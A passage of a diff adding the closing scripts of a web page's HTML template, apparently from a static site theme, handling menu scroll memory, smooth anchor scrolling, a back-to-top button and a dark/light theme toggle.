+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
